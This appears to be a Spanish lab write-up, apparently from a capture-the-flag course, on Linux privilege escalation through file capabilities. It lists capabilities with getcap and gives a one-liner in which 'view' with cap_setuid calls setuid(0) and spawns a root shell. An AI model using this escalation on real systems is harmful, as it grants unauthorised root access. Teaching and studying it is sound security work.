# Capabilities

Otro método que los administradores de sistemas pueden utilizar para aumentar el nivel de privilegio de un proceso o binario son las "Capacidades". Las capacidades ayudan a administrar los privilegios a un nivel más granular. Por ejemplo, si el analista de SOC necesita utilizar una herramienta que necesita iniciar conexiones de socket, un usuario normal no podría hacerlo. Si el administrador del sistema no quiere otorgarle a este usuario mayores privilegios, puede cambiar las capacidades del binario. Como resultado, el binario realizaría su tarea sin necesitar un usuario con mayores privilegios.\
La página de manual de capacidades proporciona información detallada sobre su uso y opciones.

Podemos usar la `getcap` herramienta para enumerar las capacidades habilitadas.

```shell
karen@ip-10-10-201-196:~$ getcap -r / 2>/dev/null
```

<figure><img src="../../.gitbook/assets/20231008160710.png" alt=""><figcaption></figcaption></figure>

```shell
cp $(which view) .
sudo setcap cap_setuid+ep view

./view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

<figure><img src="../../.gitbook/assets/20231008170251.png" alt=""><figcaption></figcaption></figure>

Una vez ejecutado, podemos ser el usuario root

<figure><img src="../../.gitbook/assets/20231008170352.png" alt=""><figcaption></figcaption></figure>
